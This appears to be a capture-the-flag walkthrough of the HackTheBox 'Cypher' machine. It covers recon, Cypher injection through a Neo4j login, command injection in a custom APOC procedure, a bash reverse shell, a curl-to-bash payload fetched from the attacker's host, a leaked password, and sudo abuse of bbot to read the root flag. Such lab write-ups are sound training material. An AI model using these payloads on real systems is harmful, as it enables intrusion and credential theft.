## Recon
-> nmap :
``` bash
╰─ nmap -sC -sV -p- -Pn --min-rate 10000 10.10.11.57 -oN Cypher-nmap 
Nmap scan report for 10.10.11.57
Host is up (0.093s latency).
Not shown: 62691 closed tcp ports (conn-refused), 2842 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

-> Add `cypher.htb` to `/etc/hosts`:
`10.10.11.57 cypher.htb`

### source code :
i noticed in the source code a comment to make into consideration for later `TODO: don't store user accounts in neo4j` 
:
```javascript
<script>
    // TODO: don't store user accounts in neo4j
    function doLogin(e) {
      e.preventDefault();
      var username = $("#usernamefield").val();
```

-> This gives me the idea that neo4j handles backend authentication process

-> When i try an xss paylod i get this error :
`<IMG SRC= onmouseover="alert('xxs')">`

![Pasted image](./Pasted%20image%2020250423223733.png)

-> Indicating a **Cypher Injection** (injection for GQL), where there is a cypher query to fetch data like this :
```GQL
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '<USER_INPUT>' RETURN h.value AS hash
```

### directory fuzzing :


```bash
╰─ gobuster dir -u cypher.htb -w /usr/share/dirb/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cypher.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 4562]
/about                (Status: 200) [Size: 4986]
/login                (Status: 200) [Size: 3671]
/demo                 (Status: 307) [Size: 0] [--> /login]
/api                  (Status: 307) [Size: 0] [--> /api/docs]
/testing              (Status: 301) [Size: 178] [--> http://cypher.htb/testing/]
```

![[Pasted image 20250423230317.png]]

#### APOC 
->Neo4j supports the APOC (Awesome Procedures on Cypher) Core library. The APOC Core library provides access to user-defined procedures and functions which extend the use of the [Cypher query language](https://neo4j.com/docs/cypher-manual/current/introduction/) into areas such as data integration, graph algorithms, and data conversion.


-> In the jar we find :
```java
public class CustomFunctions {  
    @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)  
    @Description("Returns the HTTP status code for the given URL as a string")  
    public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {  
        if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {  
            url = "https://" + url;  
        }  
        String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};  
        System.out.println("Command: " + Arrays.toString(command));  
        Process process = Runtime.getRuntime().exec(command);  
        BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));  
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));  
        StringBuilder errorOutput = new StringBuilder();
```

-> This code enables us to do a remote code execution 
### shell creation

First create a shell script to upload to the server :
```bash
echo "/bin/bash -i >& /dev/tcp/10.10.16.86/4444 0>&1" > shell.sh
```

-> Use a python http server to upload it 
```bash
python3 -m http.server 80
```
-> Run a nc listner in the declared port in shell.sh
```bash
nc -lvnp 4444
```

-> In burpsuite use below to gain foothold to the system (upload the shell and execute it)

```json
"username":"haha' return h.value as a UNION CALL custom.getUrlStatusCode(\"cypher.com; curl 10.10.16.86/shell.sh|bash;#\") YIELD statusCode AS a RETURN a;//","password":"test"
```

-> Here we get that the shell is uploaded :
```bash
╰─ sudo python3 -m http.server 80

[sudo] password for med: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.57 - - [24/Apr/2025 00:10:40] "GET /shell.sh HTTP/1.1" 200 -
```

-> And we have a shell :
```bash
╰─ nc -lvnp 4444

Listening on 0.0.0.0 4444
Connection received on 10.10.11.57 40898
bash: cannot set terminal process group (1446): Inappropriate ioctl for device
bash: no job control in this shell
neo4j@cypher:/$ 
```

-> We find a gfile called `bbot_preset.yml`

```bash
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

-> We connect using ssh to `graphasm` and we got user flag :
```bash
╰─ ssh graphasm@cypher.htb
graphasm@cypher.htb's password: 

graphasm@cypher:~$ ls
bbot_preset.yml  user.txt
```

-> When we use `sudo -l` to see the abilities of our user we fin :
```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot

```
-> Our user can run an app caller bbot (which is an osint app)
-> After a bit of research i found a way to get around it and get the flag inspired by this amazing article : https://azraeldeathangel.medium.com/privilege-escalation-in-linux-via-bbot-binary-92558b4c7f30

-> where i will abuse the yara functionnality by specifying the root flag as a yara rule, the binary bbot then will display it's content in the debug information like this :

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt --debug
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot
...

[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
[DBUG] internal.excavate: Final combined yara rule contents: XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
...
```
